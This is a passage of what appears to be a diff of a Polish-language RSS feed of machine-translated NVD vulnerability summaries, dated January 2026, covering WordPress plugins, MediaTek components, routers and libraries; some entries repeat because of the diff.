2026 16:36:41 +0000</pubDate><description>Niewłaściwa kontrola nazwy pliku dla instrukcji Include/Require w programie PHP („Zdalne dołączanie plików PHP”) w CodexThemes TheGem Theme Elements (dla Elementora) thegem-elements-elementor umożliwia włączenie lokalnego pliku PHP. Ten problem dotyczy TheGem Theme Elements (dla Elementora): od n/a do &lt;= 5.11.0.</description></item><item><title>CVE-2025-69355</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69355</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w Tickera Tickera tickera-event-ticketing-system umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Tickera: od n/a do &lt;= 3.5.6.4.</description></item><item><title>CVE-2025-69354</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69354</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji we wtyczkach BBR Better Business Reviews Better-Business-Reviews umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Better Business Reviews: od n/a do &lt;= 0.1.1.</description></item><item><title>CVE-2025-69353</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69353</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Brakująca luka w autoryzacji w proxy i amp;Serwer proxy blokujący VPN &amp;amp;Blokada VPN Blokada proxy VPN umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy serwerów proxy i &amp;amp;Blokada VPN: od n/d do &lt;= 3.5.3.</description></item><item><title>CVE-2025-69352</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69352</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Brakująca luka autoryzacyjna w StellarWP Kalendarz wydarzeń the-events-calendar umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Kalendarza wydarzeń: od n/a do &lt;= 6.15.12.2.</description></item><item><title>CVE-2025-69351</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69351</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja elementów specjalnych używanych w poleceniu SQL („wstrzyknięcie SQL”) w Shahjahan Jewel Ninja Tables ninja-tables umożliwia ślepy wtrysk SQL. Ten problem dotyczy tabel Ninja: od n/a do &lt;= 5.2.4.</description></item><item><title>CVE-2025-69350</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69350</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Luka w zabezpieczeniach Themepoints Accordion accordions-wp podczas nieprawidłowej neutralizacji danych wejściowych podczas generowania strony internetowej („skrypty między witrynami”) umożliwia przechowywanie XSS. Ten problem dotyczy Accordion: od n/a do &lt;= 3.0.3.</description></item><item><title>CVE-2025-69349</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69349</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka w zabezpieczeniach w Fahad Mahmood RSS Feed Widget rss-feed-widget umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy widgetu kanału RSS: od n/a do &lt;= 3.0.2.</description></item><item><title>CVE-2025-69348</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69348</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka autoryzacyjna w CoolHappy Dodatek odliczający kalendarz wydarzeń umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy dodatku odliczającego kalendarz wydarzeń: od n/a do &lt;= 1.4.15.</description></item><item><title>CVE-2025-69346</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69346</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka w autoryzacji w WPCenter AffiliateX AffiliateX umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy AffiliateX: od n/a do &lt;= 1.3.9.3.</description></item><item><title>CVE-2025-69345</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69345</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w BoldGrid Post i Kreatorze stron autorstwa BoldGrid narzędzia do tworzenia postów i stron umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy Postu i Kreatora stron BoldGrid: od n/a do &lt;= 1.27.9.</description></item><item><title>CVE-2025-69342</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69342</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Niewłaściwa kontrola nazwy pliku dla instrukcji Include/Require w programie PHP („Zdalne dołączanie plików PHP”) w VanKarWai. Calafate Calafate umożliwia włączenie lokalnego pliku PHP. Ten problem dotyczy Calafate: od n/a do &lt;= 1.7.7.</description></item><item><title>CVE-2025-69341</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69341</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Brakująca luka w autoryzacji w BuddhaThemes WeDesignTech Ultimate Booking Addon wedesigntech-ultimate-booking-addon umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy WeDesignTech Ultimate Booking Addon: od n/a do &lt;= 1.0.3.</description></item><item><title>CVE-2025-69336</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69336</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w bdthemes Ultimate Store Kit Elementor Addons Ultimate-store-kit umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy dodatków Ultimate Store Kit Elementor Addons: od n/a do &lt;= 2.9.4.</description></item><item><title>CVE-2025-69335</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69335</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Luka w zabezpieczeniach programu Themepoints Team Showcase umożliwiająca przechowywanie danych XSS. Ten problem dotyczy Team Showcase: od n/a do &lt;= 2.9.</description></item><item><title>CVE-2025-69334</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69334</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja danych wejściowych podczas generowania strony internetowej („Skrypty między witrynami”) w WPFactory Lista życzeń dla WooCommerce umożliwia przechowywanie XSS. Ten problem dotyczy listy życzeń dla WooCommerce: od n/a do &lt;= 3.3.0.</description></item><item><title>CVE-2025-69331</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69331</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w Jeroen Schmit Theatre dla WordPress Theater umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Theatre for WordPress: od n/a do &lt;= 0.19.</description></item><item><title>CVE-2025-69327</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69327</link><pubDate>Tue, 06 Jan 2026 16:36:37 +0000</pubDate><description>Brakująca luka w autoryzacji w magepeopleteam Car Rental Manager car-rental-manager umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Car Rental Manager: od n/a do &lt;= 1.0.9.</description></item><item><title>CVE-2026-0640</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0640</link><pubDate>Tue, 06 Jan 2026 15:32:08 +0000</pubDate><description>W Tenda AC23 16.03.07.52 wykryto słabość.Ma to wpływ na funkcję sscanf pliku /goform/PowerSaveSet.Wykonanie manipulacji argumentem Czas może prowadzić do przepełnienia bufora.Atak może zostać przeprowadzony zdalnie.Exploit został udostępniony publicznie i może zostać wykorzystany do ataków.
 
 CVSS Score: 8.8 (high)</description></item><item><title>CVE-2025-46696</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-46696</link><pubDate>Tue, 06 Jan 2026 15:30:27 +0000</pubDate><description>Urządzenie i aplikacja Dell Secure Connect Gateway (SCG) 5.0, wersje od 5.26 do 5.30, zawierają lukę w zabezpieczeniach umożliwiającą wykonanie z niepotrzebnymi uprawnieniami.Osoba atakująca z wysokimi uprzywilejowaniami i dostępem lokalnym może potencjalnie wykorzystać tę lukę, prowadząc do podniesienia uprawnień.</description></item><item><title>CVE-2025-14026</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14026</link><pubDate>Tue, 06 Jan 2026 15:30:27 +0000</pubDate><description>Klient Forcepoint One DLP, wersja 23.04.5642 (i ewentualnie nowsze wersje), zawiera ograniczoną wersję Pythona 2.5.4, która uniemożliwia korzystanie z biblioteki ctypes.ctypes to interfejs funkcji obcych (FFI) dla Pythona, umożliwiający wywoływanie bibliotek DLL/bibliotek współdzielonych, alokację pamięci i bezpośrednie wykonanie kodu.Wykazano, że ograniczenia te można ominąć.</description></item><item><title>CVE-2025-14979</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14979</link><pubDate>Tue, 06 Jan 2026 15:15:30 +0000</pubDate><description>AirVPN Eddie na MacOS zawiera niezabezpieczoną usługę XPC, która pozwala lokalnym, nieuprzywilejowanym użytkownikom na zwiększenie swoich uprawnień do roota. Ten problem dotyczy Eddiego: 2.24.6.</description></item><item><title>CVE-2026-21493</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21493</link><pubDate>Tue, 06 Jan 2026 14:11:27 +0000</pubDate><description>iccDEV zapewnia zestaw bibliotek i narzędzi do pracy z profilami zarządzania kolorami ICC.Wersje 2.3.1.1 i starsze są podatne na pomieszanie typów w klasie CIccSingleSampledeCurveXml podczas serializacji krzywej XML.Ten problem został rozwiązany w wersji 2.3.1.2.
 
@@ -37,7 +367,7 @@ CVSS Score: 8.8 (high)</description></item><item><title>CVE-2026-21486</title><l
 
 CVSS Score: 7.8 (high)</description></item><item><title>CVE-2025-13652</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-13652</link><pubDate>Tue, 06 Jan 2026 03:21:39 +0000</pubDate><description>Wtyczka CBX Bookmark &amp; ​​Favourite do WordPressa jest podatna na ogólne wstrzykiwanie kodu SQL za pośrednictwem parametru „orderby” we wszystkich wersjach aż do wersji 2.0.4 włącznie z powodu niewystarczającej ucieczki od parametru dostarczonego przez użytkownika i braku wystarczającego przygotowania istniejącego zapytania SQL.Dzięki temu uwierzytelnieni atakujący z dostępem na poziomie subskrybenta i wyższym mogą dołączać dodatkowe zapytania SQL do już istniejących zapytań, które można wykorzystać do wyodrębnienia poufnych informacji z bazy danych.
 
-CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2025-20807</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20807</link><pubDate>Tue, 06 Jan 2026 01:47:42 +0000</pubDate><description>W dpe możliwy jest zapis poza zakresem z powodu przepełnienia liczby całkowitej.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10114841;Identyfikator problemu: MSV-4451.</description></item><item><title>CVE-2025-20806</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20806</link><pubDate>Tue, 06 Jan 2026 01:47:16 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci spowodowane użyciem po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10114835;Identyfikator problemu: MSV-4479.</description></item><item><title>CVE-2025-20805</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20805</link><pubDate>Tue, 06 Jan 2026 01:47:14 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci spowodowane użyciem po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10114696;Identyfikator problemu: MSV-4480.</description></item><item><title>CVE-2025-20804</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20804</link><pubDate>Tue, 06 Jan 2026 01:47:12 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci spowodowane użyciem po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania potrzebna jest interakcja użytkownika.Identyfikator poprawki: ALPS10198951;Identyfikator problemu: MSV-4503.</description></item><item><title>CVE-2025-20803</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20803</link><pubDate>Tue, 06 Jan 2026 01:47:10 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci z powodu przepełnienia liczb całkowitych.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania potrzebna jest interakcja użytkownika.Identyfikator poprawki: ALPS10199779;Identyfikator problemu: MSV-4504.</description></item><item><title>CVE-2025-20787</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20787</link><pubDate>Tue, 06 Jan 2026 01:47:09 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci w wyniku użycia po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10149879;Identyfikator problemu: MSV-4658.</description></item><item><title>CVE-2025-20786</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20786</link><pubDate>Tue, 06 Jan 2026 01:47:07 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci w wyniku użycia po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10149882;Identyfikator problemu: MSV-4673.</description></item><item><title>CVE-2025-20785</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20785</link><pubDate>Tue, 06 Jan 2026 01:47:05 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci w wyniku użycia po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10149882;Identyfikator problemu: MSV-4677.</description></item><item><title>CVE-2025-20784</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20784</link><pubDate>Tue, 06 Jan 2026 01:47:03 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci z powodu niezainicjowanych danych.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10182882;Identyfikator problemu: MSV-4683.</description></item><item><title>CVE-2025-20783</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20783</link><pubDate>Tue, 06 Jan 2026 01:47:01 +0000</pubDate><description>Na wyświetlaczu możliwy jest zapis poza zakresem z powodu sprawdzenia brakujących granic.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10182882;Identyfikator problemu: MSV-4684.</description></item><item><title>CVE-2025-20782</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20782</link><pubDate>Tue, 06 Jan 2026 01:46:59 +0000</pubDate><description>Na wyświetlaczu możliwy jest zapis poza zakresem z powodu sprawdzenia brakujących granic.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10182882;Identyfikator problemu: MSV-4685.</description></item><item><title>CVE-2025-65212</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-65212</link><pubDate>Tue, 06 Jan 2026 00:00:00 +0000</pubDate><description>Wykryto problem w rdzeniu NJHYST HY511 POE przed wersją 2.1 i wtyczkami przed wersją 0.1.Luka wynika z niewystarczającej weryfikacji plików cookie przez urządzenie, co pozwala osobie atakującej bezpośrednio zażądać adresu pliku konfiguracyjnego i pobrać podstawowy plik konfiguracyjny bez logowania się do zaplecza zarządzania urządzeniem.Odczytując odpowiednią nazwę użytkownika i samoodszyfrowane hasło MD5 w podstawowym pliku konfiguracyjnym, osoba atakująca może bezpośrednio zalogować się do backendu, omijając w ten sposób stronę logowania backendu.</description></item><item><title>CVE-2025-66648</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66648</link><pubDate>Mon, 05 Jan 2026 21:33:14 +0000</pubDate><description>vega-functions zapewnia implementacje funkcji dla języka wyrażeń Vega.Przed wersją 6.1.1 w przypadku witryn umożliwiających użytkownikom wprowadzanie danych wejściowych przez niezaufanego użytkownika, złośliwe użycie funkcji wewnętrznej (niebędącej częścią publicznego interfejsu API) mogło zostać wykorzystane do niezamierzonego uruchomienia kodu JavaScript (XSS).Ten problem został rozwiązany w funkcjach Vega `6.1.1`.Nie ma innego rozwiązania niż aktualizacja.Użycie `vega.expressionInterpreter` zgodnie z opisem w trybie awaryjnym CSP nie zapobiega temu problemowi.
+CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2025-20807</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20807</link><pubDate>Tue, 06 Jan 2026 01:47:42 +0000</pubDate><description>W dpe możliwy jest zapis poza zakresem z powodu przepełnienia liczby całkowitej.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10114841;Identyfikator problemu: MSV-4451.</description></item><item><title>CVE-2025-20806</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20806</link><pubDate>Tue, 06 Jan 2026 01:47:16 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci spowodowane użyciem po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10114835;Identyfikator problemu: MSV-4479.</description></item><item><title>CVE-2025-20805</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20805</link><pubDate>Tue, 06 Jan 2026 01:47:14 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci spowodowane użyciem po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10114696;Identyfikator problemu: MSV-4480.</description></item><item><title>CVE-2025-20804</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20804</link><pubDate>Tue, 06 Jan 2026 01:47:12 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci spowodowane użyciem po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania potrzebna jest interakcja użytkownika.Identyfikator poprawki: ALPS10198951;Identyfikator problemu: MSV-4503.</description></item><item><title>CVE-2025-20803</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20803</link><pubDate>Tue, 06 Jan 2026 01:47:10 +0000</pubDate><description>W dpe możliwe jest uszkodzenie pamięci z powodu przepełnienia liczb całkowitych.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania potrzebna jest interakcja użytkownika.Identyfikator poprawki: ALPS10199779;Identyfikator problemu: MSV-4504.</description></item><item><title>CVE-2025-20787</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20787</link><pubDate>Tue, 06 Jan 2026 01:47:09 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci w wyniku użycia po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10149879;Identyfikator problemu: MSV-4658.</description></item><item><title>CVE-2025-20786</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20786</link><pubDate>Tue, 06 Jan 2026 01:47:07 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci w wyniku użycia po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10149882;Identyfikator problemu: MSV-4673.</description></item><item><title>CVE-2025-20785</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20785</link><pubDate>Tue, 06 Jan 2026 01:47:05 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci w wyniku użycia po zwolnieniu.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10149882;Identyfikator problemu: MSV-4677.</description></item><item><title>CVE-2025-20784</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20784</link><pubDate>Tue, 06 Jan 2026 01:47:03 +0000</pubDate><description>Na wyświetlaczu możliwe jest uszkodzenie pamięci z powodu niezainicjowanych danych.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10182882;Identyfikator problemu: MSV-4683.</description></item><item><title>CVE-2025-20783</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20783</link><pubDate>Tue, 06 Jan 2026 01:47:01 +0000</pubDate><description>Na wyświetlaczu możliwy jest zapis poza zakresem z powodu sprawdzenia brakujących granic.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10182882;Identyfikator problemu: MSV-4684.</description></item><item><title>CVE-2025-20782</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-20782</link><pubDate>Tue, 06 Jan 2026 01:46:59 +0000</pubDate><description>Na wyświetlaczu możliwy jest zapis poza zakresem z powodu sprawdzenia brakujących granic.Może to prowadzić do lokalnej eskalacji uprawnień, jeśli złośliwy aktor uzyskał już uprawnienie System.Do wykorzystania nie jest wymagana interakcja użytkownika.Identyfikator poprawki: ALPS10182882;Identyfikator problemu: MSV-4685.</description></item><item><title>CVE-2025-65212</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-65212</link><pubDate>Tue, 06 Jan 2026 00:00:00 +0000</pubDate><description>Wykryto problem w rdzeniu NJHYST HY511 POE przed wersją 2.1 i wtyczkami przed wersją 0.1.Luka wynika z niewystarczającej weryfikacji plików cookie przez urządzenie, co pozwala osobie atakującej bezpośrednio zażądać adresu pliku konfiguracyjnego i pobrać podstawowy plik konfiguracyjny bez logowania się do zaplecza zarządzania urządzeniem.Odczytując odpowiednią nazwę użytkownika i samoodszyfrowane hasło MD5 w podstawowym pliku konfiguracyjnym, osoba atakująca może bezpośrednio zalogować się do backendu, omijając w ten sposób stronę logowania backendu.</description></item><item><title>CVE-2025-68436</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68436</link><pubDate>Mon, 05 Jan 2026 21:46:01 +0000</pubDate><description>Craft to platforma do tworzenia cyfrowych doświadczeń.W wersjach od 5.0.0-RC1 do 5.8.20 i od 4.0.0-RC1 do 4.16.16 uwierzytelnieni użytkownicy instalacji Craft mogą potencjalnie ujawnić wrażliwe zasoby poprzez zdjęcie profilowe użytkownika za pośrednictwem złośliwie spreparowanych żądań.Użytkownicy powinni dokonać aktualizacji do poprawionych wersji (5.8.21 i 4.16.17), aby złagodzić problem.</description></item><item><title>CVE-2025-68428</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68428</link><pubDate>Mon, 05 Jan 2026 21:43:55 +0000</pubDate><description>jsPDF to biblioteka do generowania plików PDF w JavaScript.W wersjach wcześniejszych niż 4.0.0 kontrola użytkownika nad pierwszym argumentem metody loadingFile w kompilacji node.js umożliwiała dołączanie plików lokalnych/przechodzenie ścieżek.Jeśli użytkownik ma możliwość przekazania nieoczyszczonych ścieżek do metody LoadFile, użytkownik może pobrać zawartość dowolnych plików w lokalnym systemie plików, w którym działa proces węzła. Zawartość pliku jest dosłownie dołączana do wygenerowanych plików PDF.Inne metody, których to dotyczy, to `addImage`, `html` i `addFont`.Dotyczy to tylko kompilacji biblioteki node.js, a mianowicie plików `dist/jspdf.node.js` i `dist/jspdf.node.min.js`.Luka została naprawiona w jsPDF@4.0.0.Ta wersja domyślnie ogranicza dostęp do systemu plików.Ta semver-major aktualizacja nie wprowadza innych istotnych zmian.Dostępne są pewne obejścia.W przypadku najnowszych wersji węzłów jsPDF zaleca używanie flagi `--permission` w środowisku produkcyjnym.Funkcja została wprowadzona eksperymentalnie w wersji 20.0.0 i jest stabilna od wersji 22.13.0/23.5.0/24.0.0.W przypadku starszych wersji węzłów oczyść ścieżki dostarczone przez użytkownika przed przekazaniem ich do jsPDF.</description></item><item><title>CVE-2025-67732</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67732</link><pubDate>Mon, 05 Jan 2026 21:41:01 +0000</pubDate><description>Dify to platforma do tworzenia aplikacji LLM typu open source.Przed wersją 1.11.0 klucz API był udostępniany w interfejsie użytkownika w postaci zwykłego tekstu, umożliwiając użytkownikom niebędącym administratorami jego przeglądanie i ponowne użycie.Może to prowadzić do nieautoryzowanego dostępu do usług stron trzecich, potencjalnie zużywając ograniczone przydziały.Wersja 1.11.0 rozwiązuje ten problem.</description></item><item><title>CVE-2025-66648</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66648</link><pubDate>Mon, 05 Jan 2026 21:33:14 +0000</pubDate><description>vega-functions zapewnia implementacje funkcji dla języka wyrażeń Vega.Przed wersją 6.1.1 w przypadku witryn umożliwiających użytkownikom wprowadzanie danych wejściowych przez niezaufanego użytkownika, złośliwe użycie funkcji wewnętrznej (niebędącej częścią publicznego interfejsu API) mogło zostać wykorzystane do niezamierzonego uruchomienia kodu JavaScript (XSS).Ten problem został rozwiązany w funkcjach Vega `6.1.1`.Nie ma innego rozwiązania niż aktualizacja.Użycie `vega.expressionInterpreter` zgodnie z opisem w trybie awaryjnym CSP nie zapobiega temu problemowi.
 
 CVSS Score: 7.2 (high)</description></item><item><title>CVE-2025-12511</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-12511</link><pubDate>Mon, 05 Jan 2026 14:05:52 +0000</pubDate><description>Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) Luka w zabezpieczeniach Centreon Infra Monitoring (moduły konfiguracyjne DSM extenstio) umożliwia przechowywanie XSS
 
